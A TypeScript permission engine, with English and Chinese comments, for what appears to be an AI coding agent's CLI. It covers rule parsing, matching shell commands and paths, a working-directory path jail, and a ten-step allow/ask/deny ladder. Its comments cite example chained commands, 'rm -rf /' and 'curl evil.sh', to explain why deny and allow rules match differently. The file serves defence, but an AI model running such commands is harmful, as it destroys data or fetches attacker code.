// 本文件：权限引擎——规则解析、规则匹配、路径沙箱，以及每次工具调用前唯一的判定阶梯。
import picomatch from 'picomatch'
import type { PermissionResult, Tool, ToolContext } from '../Tool.js'
import type {
  DecisionReason,
  PermissionContext,
  PermissionRule,
  RuleBehavior,
  RuleSource,
} from '../types/permissions.js'
import { commandMatches, parseCommand } from './bashParser.js'
import { isInside, toAbsolute, toPosixPath } from './paths.js'

export type Decision = PermissionResult & { reason: DecisionReason }

/**
 * Parse a rule string: "Bash(git push:*)" / "Edit(src/**)" / "WebFetch".
 * Returns undefined for malformed input rather than throwing — a typo in
 * settings.json must not brick the CLI.
 * 解析规则字符串："Bash(git push:*)" / "Edit(src/**)" / "WebFetch"。
 * 非法输入返回 undefined 而非抛异常：settings.json 里的手误不该让 CLI 无法启动。
 */
// 本函数：把单条规则文本解析成 PermissionRule；解析失败返回 undefined。
export function parseRule(
  text: string,
  behavior: RuleBehavior,
  source: RuleSource,
): PermissionRule | undefined {
  const match = /^([A-Za-z_][\w-]*)(?:\((.*)\))?$/.exec(text.trim())
  if (!match) return undefined
  return {
    toolName: match[1]!,
    content: match[2]?.trim() || undefined,
    behavior,
    source,
  }
}

// 本函数：把某一来源的 allow/deny/ask 规则列表批量解析成规则数组（deny 在前）。
export function parseRules(
  raw: { allow?: string[]; deny?: string[]; ask?: string[] } | undefined,
  source: RuleSource,
): PermissionRule[] {
  if (!raw) return []
  const rules: PermissionRule[] = []
  for (const [behavior, list] of [
    ['deny', raw.deny],
    ['ask', raw.ask],
    ['allow', raw.allow],
  ] as const) {
    for (const text of list ?? []) {
      const rule = parseRule(text, behavior, source)
      if (rule) rules.push(rule)
    }
  }
  return rules
}

/**
 * Does this rule apply to this call?
 * 这条规则适用于这次调用吗？
 *
 * A rule with no content matches every call to the tool. A rule with content
 * is matched against whatever the tool considers its "subject": the command
 * for shells, the path for file tools.
 * 没有内容的规则匹配该工具的每一次调用；有内容的规则则匹配工具的「主体」：
 * shell 看命令，文件工具看路径。
 *
 * For a chained shell command the quantifier depends on the behaviour, and
 * getting this backwards is a security hole:
 * 对串联命令，量词取决于规则行为，弄反就是安全漏洞：
 *
 *   deny  -> ANY subcommand matching is enough to block.
 *            `git status && rm -rf /` must be caught by `Bash(rm *)`.
 *   deny  -> 任一子命令命中即拦截。`git status && rm -rf /` 必须被 `Bash(rm *)` 抓住。
 *   allow -> EVERY subcommand must match.
 *            `Bash(npm test)` must NOT green-light `npm test && curl evil.sh`.
 *   allow -> 每条子命令都要命中。`Bash(npm test)` 绝不能放行 `npm test && curl evil.sh`。
 *
 * An `ask` rule uses the deny quantifier: if any part is interesting, ask.
 * `ask` 规则采用 deny 的量词：只要有一段可疑就询问。
 */
// 本函数：判断一条规则是否命中本次调用（命令按行为选择「任一/全部」量词，文件按 glob 匹配路径）。
function ruleMatches(rule: PermissionRule, tool: Tool, input: unknown, cwd: string): boolean {
  if (rule.toolName !== tool.name) return false
  if (!rule.content) return true

  const record = input as Record<string, unknown>

  if (typeof record.command === 'string') {
    const { parts, hasUnsupportedSyntax } = parseCommand(record.command)
    if (rule.behavior === 'allow') {
      // Never vouch for syntax we do not model (subshells, backticks).
      // 对未建模的语法（子 shell、反引号）绝不担保。
      if (hasUnsupportedSyntax) return false
      return parts.length > 0 && parts.every(part => commandMatches(rule.content!, part))
    }
    return parts.some(part => commandMatches(rule.content!, part))
  }

  // File tools match on the path, as a glob relative to cwd.
  // 文件工具按相对 cwd 的路径 glob 匹配。
  const path = typeof record.file_path === 'string' ? record.file_path : undefined
  if (path) {
    const relative = toPosixPath(toAbsolute(cwd, path)).replace(`${toPosixPath(cwd)}/`, '')
    return picomatch(rule.content, { dot: true })(relative)
  }

  return false
}

/**
 * First matching rule of this behavior, or undefined.
 * 该行为下第一条命中的规则，没有则 undefined。
 */
// 本函数：在规则列表中找出指定行为下第一条命中本次调用的规则。
function findRule(
  rules: PermissionRule[],
  behavior: RuleBehavior,
  tool: Tool,
  input: unknown,
  cwd: string,
): PermissionRule | undefined {
  return rules.find(rule => rule.behavior === behavior && ruleMatches(rule, tool, input, cwd))
}

/**
 * Path jail: every file a tool touches must be inside cwd or an explicitly
 * allowed directory.
 * 路径沙箱：工具触碰的每个文件都必须位于 cwd 或显式许可的目录之内。
 *
 * This is separate from the rule system on purpose. Rules are policy, which a
 * user can widen. The jail is a boundary — it is checked BEFORE the mode, so
 * even bypassPermissions cannot write to C:\Windows.
 * 它刻意独立于规则系统之外：规则是可被用户放宽的「策略」，沙箱是「边界」——
 * 它在模式之前检查，所以连 bypassPermissions 也写不进 C:\Windows。
 */
// 本函数：检查本次写入是否越出 cwd 与许可目录；越界时返回越界的绝对路径。
function checkPathJail(
  tool: Tool,
  input: unknown,
  context: PermissionContext,
): { path: string } | undefined {
  const record = input as Record<string, unknown>
  const raw = record.file_path ?? record.path
  if (typeof raw !== 'string') return undefined
  if (tool.isReadOnly?.(input)) return undefined // reading outside cwd is allowed
  // 读取 cwd 之外是允许的

  const target = toAbsolute(context.cwd, raw)
  const roots = [context.cwd, ...context.additionalDirectories]
  return roots.some(root => isInside(root, target)) ? undefined : { path: target }
}

/**
 * THE DECISION LADDER.
 * 判定阶梯。
 *
 * Order is a security property, not a style choice. Reading top to bottom:
 * 顺序本身就是安全属性，而非风格选择。自上而下：
 *
 *   1. deny rule           beats everything, including bypassPermissions
 *   1. deny 规则           压过一切，包括 bypassPermissions
 *   2. path jail           a boundary, not a policy
 *   2. 路径沙箱            是边界，不是策略
 *   3. tool's own veto     a tool may refuse its own call
 *   3. 工具自我否决        工具可以拒绝自己的调用
 *   4. plan mode           read-only enforcement
 *   4. plan 模式           强制只读
 *   5. ask rule            explicit "always ask", beats an allow rule
 *   5. ask 规则            显式「总是询问」，压过 allow 规则
 *   6. read-only call      never interrupts
 *   6. 只读调用            绝不打扰
 *   7. allow rule
 *   7. allow 规则
 *   8. mode                acceptEdits / bypassPermissions
 *   8. 模式                acceptEdits / bypassPermissions
 *   9. session allowlist
 *   9. 会话级允许名单
 *  10. default             ask
 *  10. 默认                询问
 *
 * cf. hasPermissionsToUseToolInner in src/utils/permissions/permissions.ts,
 * whose equivalent steps are commented 1a through 3.
 * 参见 src/utils/permissions/permissions.ts 的 hasPermissionsToUseToolInner，
 * 其对应步骤的注释是 1a 到 3。
 */
// 本函数：按十级阶梯得出本次工具调用的 allow / ask / deny 判定，并附带判定理由。
export function evaluatePermission(tool: Tool, input: unknown, ctx: ToolContext): Decision {
  const context = ctx.permissions
  const { rules, cwd } = context

  // 1. Deny rules win outright.
  // 1. deny 规则直接胜出。
  const denyRule = findRule(rules, 'deny', tool, input, cwd)
  if (denyRule) {
    return {
      behavior: 'deny',
      message: `blocked by deny rule ${formatRule(denyRule)} (${denyRule.source})`,
      reason: { type: 'denyRule', rule: denyRule },
    }
  }

  // 2. The path jail is a boundary. Even bypassPermissions does not cross it.
  // 2. 路径沙箱是边界，连 bypassPermissions 也跨不过去。
  const escape = checkPathJail(tool, input, context)
  if (escape) {
    return {
      behavior: 'deny',
      message:
        `${escape.path} is outside the working directory. ` +
        'Add it with --add-dir if this is intentional.',
      reason: { type: 'pathJail', path: escape.path },
    }
  }

  // 3. The tool may veto itself.
  // 3. 工具可以否决自己。
  const toolPolicy = tool.checkPermissions?.(input, ctx)
  if (toolPolicy?.behavior === 'deny') {
    return { ...toolPolicy, reason: { type: 'toolPolicy' } }
  }

  const readOnly = tool.isReadOnly?.(input) ?? false

  // 4. Plan mode: absolutely nothing mutates.
  // 4. plan 模式：绝不允许任何改动。
  if (context.mode === 'plan' && !readOnly) {
    return {
      behavior: 'deny',
      message:
        'Plan mode is active, so this action cannot run. ' +
        'Finish investigating and present a plan; the user will approve it before you act.',
      reason: { type: 'mode', mode: 'plan' },
    }
  }

  // 5. An explicit ask rule beats an allow rule and beats the mode.
  // 5. 显式 ask 规则压过 allow 规则，也压过模式。
  const askRule = findRule(rules, 'ask', tool, input, cwd)
  if (askRule) {
    return {
      behavior: 'ask',
      message: describeCall(tool, input),
      reason: { type: 'askRule', rule: askRule },
    }
  }

  // 6. Read-only calls never interrupt.
  // 6. 只读调用绝不打扰人类。
  if (readOnly) return { behavior: 'allow', reason: { type: 'readOnly' } }

  // 7. Allow rules.
  // 7. allow 规则。
  const allowRule = findRule(rules, 'allow', tool, input, cwd)
  if (allowRule) return { behavior: 'allow', reason: { type: 'allowRule', rule: allowRule } }

  // 8. Modes.
  // 8. 模式。
  if (context.mode === 'bypassPermissions') {
    return { behavior: 'allow', reason: { type: 'mode', mode: 'bypassPermissions' } }
  }
  if (context.mode === 'acceptEdits' && isFileEdit(tool)) {
    return { behavior: 'allow', reason: { type: 'mode', mode: 'acceptEdits' } }
  }

  // 9. "Always allow" from this session.
  // 9. 本会话选过的「总是允许」。
  if (ctx.sessionAllow.has(tool.name)) {
    return { behavior: 'allow', reason: { type: 'allowRule', rule: sessionRule(tool.name) } }
  }

  // 10. Otherwise ask, deferring to the tool's own prompt text if it has one.
  // 10. 否则询问；工具若自带提示文案就用它的。
  if (toolPolicy?.behavior === 'ask') {
    return { ...toolPolicy, reason: { type: 'toolPolicy' } }
  }
  return { behavior: 'ask', message: describeCall(tool, input), reason: { type: 'default' } }
}

// 本函数：判断该工具是否属于 acceptEdits 模式覆盖的文件编辑类工具。
function isFileEdit(tool: Tool): boolean {
  return tool.name === 'Edit' || tool.name === 'Write'
}

// 本函数：为会话级「总是允许」构造一条来源为 session 的规则，供判定理由展示。
function sessionRule(toolName: string): PermissionRule {
  return { toolName, behavior: 'allow', source: 'session' }
}

// 本函数：把规则还原成 "Tool(content)" 形式的可读文本。
export function formatRule(rule: PermissionRule): string {
  return rule.content ? `${rule.toolName}(${rule.content})` : rule.toolName
}

/**
 * Human-readable one-liner for the approval prompt.
 * 用于批准提示的、人类可读的单行描述。
 */
// 本函数：生成权限询问时展示的单行调用描述，优先用工具自带的 renderCall。
export function describeCall(tool: Tool, input: unknown): string {
  if (tool.renderCall) {
    try {
      return tool.renderCall(input)
    } catch {
      // fall through
      // 出错则退回通用形式
    }
  }
  const json = JSON.stringify(input)
  return `${tool.name}(${json.length > 120 ? `${json.slice(0, 117)}...` : json})`
}
